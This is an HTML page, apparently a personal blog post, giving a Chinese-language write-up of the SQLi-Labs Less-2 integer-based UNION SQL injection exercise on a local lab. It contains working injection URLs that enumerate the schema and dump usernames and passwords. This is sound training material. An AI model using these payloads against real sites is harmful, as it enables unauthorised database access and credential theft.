@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-2 整型联合查询注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-2 整型联合查询注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.22 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, MySQL</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-2 (GET - Error based - Intiger based)</li>
+        <li><strong>提示：</strong>GET请求，基于报错，整型注入</li>
+    </ul>
+
+    <h2>2. 解题思路与前置原理</h2>
+    <p>本关为整型注入（Intiger based）。与字符型注入（如 Less-1）最大的区别在于后台 SQL 语句的构造方式。Less-2 的后台代码推测为 <code>SELECT * FROM users WHERE id = $id LIMIT 0,1</code>，参数 <code>id</code> 没有被单引号包裹。因此，在构造恶意 Payload 时，不需要使用单引号进行闭合，也不需要追加注释符来消除多余的引号。直接利用空格拼接 <code>UNION SELECT</code> 联合查询语句即可。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：探测注入点与字段数</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-2/?id=1'</code></p>
+    <p><strong>回显现象：</strong>页面报错：<code>You have an error in your SQL syntax; check the manual... near '' LIMIT 0,1' at line 1</code>。</p>
+    <p><strong>解释与原理：</strong>观察报错信息 <code>near '' LIMIT 0,1'</code>，说明输入的 <code>1'</code> 直接破坏了后台的 SQL 结构，且后台并未使用单引号包裹输入的参数。确认此处为整型注入。</p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-2/?id=1 ORDER BY 3</code> （页面正常回显）</p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-2/?id=1 ORDER BY 4</code> （页面报错：<code>Unknown column '4' in 'order clause'</code>）</p>
+    <p><strong>解释与原理：</strong>使用 <code>ORDER BY</code> 测试列数，当指定第 4 列时数据库提示找不到该列，确认后台查询共有 3 个字段。</p>
+
+    <p><strong>第二步：探测回显点</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,2,3</code></p>
+    <p><strong>回显现象：</strong>页面原本显示账号密码的位置，输出了数字 <code>2</code> 和 <code>3</code>，未显示 <code>1</code>。</p>
+    <p><strong>解释与原理：</strong>这里使用 <code>-1</code> 作为占位符，使前置查询为空。因为整型注入无需闭合单引号，直接用空格连接 <code>UNION SELECT</code>。页面回显 <code>2</code> 和 <code>3</code>，说明后端代码将查询结果的第 2 列和第 3 列输出到了前端页面，这两个位置即为回显点。</p>
+
+    <p><strong>第三步：获取基础信息</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1, database(), version()</code></p>
+    <p><strong>回显现象：</strong>页面回显点分别输出 <code>security</code> 和 <code>5.7.26</code>。</p>
+    <p><strong>解释与原理：</strong>将回显点替换为 MySQL 内置函数，<code>database()</code> 查库名，<code>version()</code> 查版本。确认库名为 <code>security</code>，版本 5.7.26 表明支持 <code>information_schema</code> 系统库。</p>
+
+    <p><strong>第四步：获取表名</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,2, group_concat(table_name) FROM information_schema.tables WHERE table_schema='security'</code></p>
+    <p><strong>回显现象：</strong>回显点 3 输出 <code>emails, referrers, uagents, users</code>。</p>
+    <p><strong>解释与原理：</strong>利用 MySQL 自带的 <code>information_schema.tables</code> 元数据表查询。通过 <code>WHERE table_schema='security'</code> 限定查询当前库，使用 <code>group_concat()</code> 函数将多行结果合并为一行输出。</p>
+
+    <p><strong>第五步：获取列名</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,2, group_concat(column_name) FROM information_schema.columns WHERE table_name='users'</code></p>
+    <p><strong>回显现象：</strong>回显点 3 输出 <code>id, username, password</code>。</p>
+    <p><strong>解释与原理：</strong>改为查询 <code>information_schema.columns</code> 表，通过 <code>table_name='users'</code> 锁定目标数据表，获取其列名（字段名）。</p>
+
+    <p><strong>第六步：提取最终数据</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1, group_concat(username), group_concat(password) FROM security.users</code></p>
+    <p><strong>回显现象：</strong>页面同时输出所有的用户名及对应的密码明文。</p>
+    <p><strong>解释与原理：</strong>已知库、表、列名，直接查询目标表 <code>users</code>。将 <code>username</code> 与 <code>password</code> 分别放入第 2 和第 3 回显点，利用 <code>group_concat()</code> 一次性全量提取数据。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>整型注入的特殊性：</strong>输入带有单引号 <code>'</code> 会导致 SQL 语法报错，因为整型查询不需要字符串引号。因此后续的 Payload 均不能携带单引号闭合和 <code>--+</code> 注释符，直接以空格拼接。</li>
+        <li><strong>占位符的必要性：</strong>在使用 <code>UNION SELECT</code> 时，必须使用 <code>id=-1</code> 让原查询为空，否则原网页会优先渲染原查询结果（如 <code>Dumb / Dumb</code>），导致后置的联合查询结果无法正常回显。</li>
+    </ul>
+
+    <h2>5. 知识点归纳：联合注入的共性</h2>
+    <p>结合 Less-1（字符型）与 Less-2（整型）的实操，联合查询注入（UNION Injection）的核心逻辑完全一致，区别仅在于“前置处理”（是否闭合单引号），后续的攻击链路完全通用：</p>
+    <ol>
+        <li><strong>测列数：</strong>必须使用 <code>ORDER BY n</code> 测试出准确的字段数，保证 <code>UNION SELECT</code> 前后列数一致。</li>
+        <li><strong>找位置：</strong>通过 <code>id=-1 UNION SELECT 1,2,3</code> 观察页面回显，确定哪些列的数据会被输出。</li>
+        <li><strong>查元数据（脱库逻辑）：</strong>
+            <ul>
+                <li>查库名：<code>database()</code></li>
+                <li>查表名：<code>SELECT table_name FROM information_schema.tables WHERE table_schema=库名</code></li>
+                <li>查列名：<code>SELECT column_name FROM information_schema.columns WHERE table_name=表名</code></li>
+            </ul>
+        </li>
+        <li><strong>拿数据：</strong>将目标字段（如 <code>username</code>, <code>password</code>）放入正确的回显点，配合 <code>group_concat()</code> 完成数据提取。</li>
+    </ol>
+
+    <h2>6. 工具环境说明</h2>
+    <p>当前阶段（Less-1 及 Less-2）采用纯手工注入。环境基于本地 phpStudy 搭建的 Apache + MySQL 环境，工具仅依赖系统自带的浏览器。后续遇到需要使用 VS Code 编写 Python 脚本，或配置 Burp Suite 进行抓包改包，及使用 SQLmap 自动化扫描时，将在对应 WP 中详细记录工具的下载、配置及代码成分解析。</p>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
